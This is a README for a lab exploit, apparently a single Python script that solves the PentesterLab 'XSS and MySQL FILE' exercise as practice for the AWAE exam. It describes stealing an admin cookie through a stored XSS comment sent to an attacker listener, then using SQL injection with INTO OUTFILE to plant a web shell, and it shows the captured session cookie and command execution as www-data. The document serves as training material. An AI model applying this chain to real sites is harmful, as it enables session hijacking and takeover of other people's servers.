Single click python solution for the XSS and MySQL pentesterlab challenge.


## Notes
Since we are suppose to provide a single script exploit for the AWAE exam machines so I thought it would be good practice to try and exploit this with a single python script.
The script first posts a comment using the postComment() function which contains the xss exploit it then listens on an HTTP server when it receives the cookie in the GET request it parses it and then uses that to inject a shell using the Admin edit feature using sqli.
I've used the INTO OUTFILE approach here with the data encoded in hex 

**How to use**

Change the following 3 things in the script according to your env
```python
attackerIP      =   "192.168.xx.xx"  # IP to start HTTP server on
attackerPort    =   8082            # Port to start HTTP server on to catch cookie
victimIP        =   "192.168.xx.xx"   # IP of challange
```

Then simply run and you'll get the results

```python
$ python exploit.py
The comment has been posted
[+] Server has been started
192.168.xx.xx - - [01/ABC/20xx 01:42:03] "GET /?cookie=PHPSESSID=f0549dnc7q5aoup3vvqtndunh0 HTTP/1.1" 200 -
Got admin Cookie: f0549dnc7q5aoup3vvqtndunh0
Starting Shell process
[*]Injection successful
[*] Shell has been Injected
1       uid=33(www-data) gid=33(www-data) groups=33(www-data)
        3       4
```





## Links

- https://pentesterlab.com/exercises/xss_and_mysql_file/course
- https://pentesterlab.com/exercises/xss_and_mysql_file/iso
